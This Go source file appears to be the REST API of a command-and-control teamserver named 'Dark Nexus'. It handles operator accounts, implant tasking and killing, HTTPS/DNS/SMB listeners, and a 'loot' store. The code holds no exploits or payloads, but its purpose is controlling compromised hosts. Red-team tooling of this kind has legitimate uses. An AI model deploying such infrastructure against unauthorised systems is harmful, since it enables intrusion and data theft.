package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/darknexus/teamserver/internal/auth"
	"github.com/darknexus/teamserver/internal/db"
	"github.com/darknexus/teamserver/internal/events"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"golang.org/x/crypto/bcrypt"
)

func jsonResponse(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func jsonError(w http.ResponseWriter, status int, msg string) {
	jsonResponse(w, status, map[string]string{"error": msg})
}

// --- Auth ---

type loginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	var req loginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	op, err := s.DB.GetOperatorByUsername(req.Username)
	if err != nil {
		jsonError(w, http.StatusUnauthorized, "invalid credentials")
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(op.PassHash), []byte(req.Password)); err != nil {
		jsonError(w, http.StatusUnauthorized, "invalid credentials")
		return
	}

	token, err := auth.GenerateToken(op.Username, op.Role)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "token generation failed")
		return
	}

	s.DB.LogEvent(op.Username, "login", "Operator logged in", "")
	events.Emit(events.EventOperatorLogin, map[string]string{"username": op.Username})

	jsonResponse(w, http.StatusOK, map[string]interface{}{
		"token":    token,
		"username": op.Username,
		"role":     op.Role,
	})
}

// handleSetup creates the first admin operator (only works when no operators exist)
func (s *Server) handleSetup(w http.ResponseWriter, r *http.Request) {
	count, _ := s.DB.OperatorCount()
	if count > 0 {
		jsonError(w, http.StatusForbidden, "setup already completed")
		return
	}

	var req loginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if len(req.Username) < 3 || len(req.Password) < 8 {
		jsonError(w, http.StatusBadRequest, "username must be 3+ chars, password 8+ chars")
		return
	}

	hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "hash failed")
		return
	}

	op := &db.Operator{
		ID:       uuid.New().String(),
		Username: req.Username,
		PassHash: string(hash),
		Role:     "admin",
	}

	if err := s.DB.CreateOperator(op); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to create operator")
		return
	}

	token, _ := auth.GenerateToken(op.Username, op.Role)
	s.DB.LogEvent(op.Username, "setup", "Initial admin operator created", "")

	jsonResponse(w, http.StatusCreated, map[string]interface{}{
		"token":    token,
		"username": op.Username,
		"role":     op.Role,
		"message":  "Dark Nexus setup complete",
	})
}

// --- Operators ---

func (s *Server) handleListOperators(w http.ResponseWriter, r *http.Request) {
	operators, err := s.DB.ListOperators()
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to list operators")
		return
	}
	if operators == nil {
		operators = []db.Operator{}
	}
	jsonResponse(w, http.StatusOK, operators)
}

type createOperatorRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Role     string `json:"role"`
}

func (s *Server) handleCreateOperator(w http.ResponseWriter, r *http.Request) {
	var req createOperatorRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if len(req.Username) < 3 || len(req.Password) < 8 {
		jsonError(w, http.StatusBadRequest, "username must be 3+ chars, password 8+ chars")
		return
	}

	// validate role
	validRoles := map[string]bool{"admin": true, "operator": true, "viewer": true}
	if !validRoles[req.Role] {
		req.Role = "operator"
	}

	// check for duplicate username
	if existing, _ := s.DB.GetOperatorByUsername(req.Username); existing != nil {
		jsonError(w, http.StatusConflict, "username already exists")
		return
	}

	hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "hash failed")
		return
	}

	op := &db.Operator{
		ID:       uuid.New().String(),
		Username: req.Username,
		PassHash: string(hash),
		Role:     req.Role,
	}

	if err := s.DB.CreateOperator(op); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to create operator")
		return
	}

	admin := getOperator(r)
	s.DB.LogEvent(admin, "operator_created", "Created operator "+req.Username+" ("+req.Role+")", "")

	jsonResponse(w, http.StatusCreated, op)
}

func (s *Server) handleDeleteOperator(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	admin := getOperator(r)

	// prevent self-deletion
	target, err := s.DB.GetOperatorByID(id)
	if err != nil {
		jsonError(w, http.StatusNotFound, "operator not found")
		return
	}
	if target.Username == admin {
		jsonError(w, http.StatusBadRequest, "cannot delete yourself")
		return
	}

	if err := s.DB.DeleteOperator(id); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to delete operator")
		return
	}

	s.DB.LogEvent(admin, "operator_deleted", "Deleted operator "+target.Username, "")
	jsonResponse(w, http.StatusOK, map[string]string{"status": "deleted"})
}

type changePasswordRequest struct {
	Password string `json:"password"`
}

func (s *Server) handleChangePassword(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]

	var req changePasswordRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if len(req.Password) < 8 {
		jsonError(w, http.StatusBadRequest, "password must be 8+ chars")
		return
	}

	hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "hash failed")
		return
	}

	if err := s.DB.UpdateOperatorPassword(id, string(hash)); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to update password")
		return
	}

	admin := getOperator(r)
	s.DB.LogEvent(admin, "password_changed", "Password changed for operator "+id[:8], "")
	jsonResponse(w, http.StatusOK, map[string]string{"status": "password updated"})
}

type changeRoleRequest struct {
	Role string `json:"role"`
}

func (s *Server) handleChangeRole(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	admin := getOperator(r)

	var req changeRoleRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	validRoles := map[string]bool{"admin": true, "operator": true, "viewer": true}
	if !validRoles[req.Role] {
		jsonError(w, http.StatusBadRequest, "invalid role, must be: admin, operator, or viewer")
		return
	}

	// prevent demoting yourself
	target, err := s.DB.GetOperatorByID(id)
	if err != nil {
		jsonError(w, http.StatusNotFound, "operator not found")
		return
	}
	if target.Username == admin && req.Role != "admin" {
		jsonError(w, http.StatusBadRequest, "cannot demote yourself")
		return
	}

	if err := s.DB.UpdateOperatorRole(id, req.Role); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to update role")
		return
	}

	s.DB.LogEvent(admin, "role_changed", "Changed "+target.Username+" role to "+req.Role, "")
	jsonResponse(w, http.StatusOK, map[string]string{"status": "role updated"})
}

// --- Implants ---

func (s *Server) handleListImplants(w http.ResponseWriter, r *http.Request) {
	implants, err := s.DB.ListImplants()
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to list implants")
		return
	}
	if implants == nil {
		implants = []db.Implant{}
	}
	jsonResponse(w, http.StatusOK, implants)
}

func (s *Server) handleGetImplant(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	imp, err := s.DB.GetImplant(id)
	if err != nil {
		jsonError(w, http.StatusNotFound, "implant not found")
		return
	}
	jsonResponse(w, http.StatusOK, imp)
}

func (s *Server) handleRemoveImplant(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	operator := getOperator(r)

	if err := s.DB.RemoveImplant(id); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to remove implant")
		return
	}

	s.DB.LogEvent(operator, "implant_removed", "Removed implant "+id[:8], id)
	events.Emit(events.EventImplantRemoved, map[string]string{"id": id})
	jsonResponse(w, http.StatusOK, map[string]string{"status": "removed"})
}

func (s *Server) handleKillImplant(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	operator := getOperator(r)

	// queue an exit task
	_, err := s.Registry.QueueTask(id, "exit", "", operator)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to queue exit task")
		return
	}

	s.DB.MarkImplantDead(id)
	jsonResponse(w, http.StatusOK, map[string]string{"status": "kill command sent"})
}

// --- Tasks ---

func (s *Server) handleListTasks(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	tasks, err := s.DB.GetTasksByImplant(id)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to list tasks")
		return
	}
	if tasks == nil {
		tasks = []db.Task{}
	}
	jsonResponse(w, http.StatusOK, tasks)
}

type createTaskRequest struct {
	Command string `json:"command"`
	Args    string `json:"args"`
}

func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	operator := getOperator(r)

	var req createTaskRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	task, err := s.Registry.QueueTask(id, req.Command, req.Args, operator)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to create task")
		return
	}

	jsonResponse(w, http.StatusCreated, task)
}

// --- Listeners ---

func (s *Server) handleListListeners(w http.ResponseWriter, r *http.Request) {
	listeners, err := s.DB.ListListeners()
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to list listeners")
		return
	}
	if listeners == nil {
		listeners = []db.Listener{}
	}
	jsonResponse(w, http.StatusOK, listeners)
}

type createListenerRequest struct {
	Name     string `json:"name"`
	Type     string `json:"type"`
	BindAddr string `json:"bind_addr"`
	Port     int    `json:"port"`
	Profile  string `json:"profile"`
}

func (s *Server) handleCreateListener(w http.ResponseWriter, r *http.Request) {
	operator := getOperator(r)

	var req createListenerRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if req.Name == "" {
		jsonError(w, http.StatusBadRequest, "name is required")
		return
	}
	if req.Port < 1 || req.Port > 65535 {
		jsonError(w, http.StatusBadRequest, "port must be between 1 and 65535")
		return
	}

	validTypes := map[string]bool{"https": true, "dns": true, "smb": true}
	if !validTypes[req.Type] {
		req.Type = "https"
	}

	if req.BindAddr == "" {
		req.BindAddr = "0.0.0.0"
	}

	l := &db.Listener{
		ID:       uuid.New().String(),
		Name:     req.Name,
		Type:     req.Type,
		BindAddr: req.BindAddr,
		Port:     req.Port,
		Status:   "stopped",
		Profile:  req.Profile,
	}

	if err := s.DB.SaveListener(l); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to save listener")
		return
	}

	s.DB.LogEvent(operator, "listener_created", fmt.Sprintf("Created %s listener '%s' on %s:%d", l.Type, l.Name, l.BindAddr, l.Port), "")
	events.Emit(events.EventListenerStarted, map[string]string{"name": l.Name, "type": l.Type})

	jsonResponse(w, http.StatusCreated, l)
}

func (s *Server) handleStopListener(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	operator := getOperator(r)

	l, err := s.DB.GetListener(id)
	if err != nil {
		jsonError(w, http.StatusNotFound, "listener not found")
		return
	}

	if err := s.DB.UpdateListenerStatus(id, "stopped"); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to update listener")
		return
	}

	s.DB.LogEvent(operator, "listener_stopped", "Stopped listener "+l.Name, "")
	events.Emit(events.EventListenerStopped, map[string]string{"id": id, "name": l.Name})

	jsonResponse(w, http.StatusOK, map[string]string{"status": "stopped"})
}

func (s *Server) handleRemoveListener(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	operator := getOperator(r)

	l, err := s.DB.GetListener(id)
	if err != nil {
		jsonError(w, http.StatusNotFound, "listener not found")
		return
	}

	if err := s.DB.RemoveListener(id); err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to remove listener")
		return
	}

	s.DB.LogEvent(operator, "listener_removed", "Removed listener "+l.Name, "")
	jsonResponse(w, http.StatusOK, map[string]string{"status": "removed"})
}

// --- Loot ---

func (s *Server) handleListLoot(w http.ResponseWriter, r *http.Request) {
	loot, err := s.DB.ListLoot()
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to list loot")
		return
	}
	if loot == nil {
		loot = []db.Loot{}
	}
	jsonResponse(w, http.StatusOK, loot)
}

// --- Events ---

func (s *Server) handleListEvents(w http.ResponseWriter, r *http.Request) {
	evts, err := s.DB.GetEvents(200)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed to list events")
		return
	}
	if evts == nil {
		evts = []map[string]interface{}{}
	}
	jsonResponse(w, http.StatusOK, evts)
}

// --- Dashboard ---

func (s *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	implants, _ := s.DB.ListImplants()
	listeners, _ := s.DB.ListListeners()
	recentEvents, _ := s.DB.GetEvents(10)

	aliveCount := 0
	deadCount := 0
	for _, imp := range implants {
		if imp.Alive && time.Since(imp.LastSeen) < time.Duration(imp.Sleep*3)*time.Second {
			aliveCount++
		} else {
			deadCount++
		}
	}

	activeListeners := 0
	for _, l := range listeners {
		if l.Status == "running" {
			activeListeners++
		}
	}

	jsonResponse(w, http.StatusOK, map[string]interface{}{
		"alive_implants":   aliveCount,
		"dead_implants":    deadCount,
		"total_implants":   len(implants),
		"active_listeners": activeListeners,
		"total_listeners":  len(listeners),
		"recent_events":    recentEvents,
	})
}
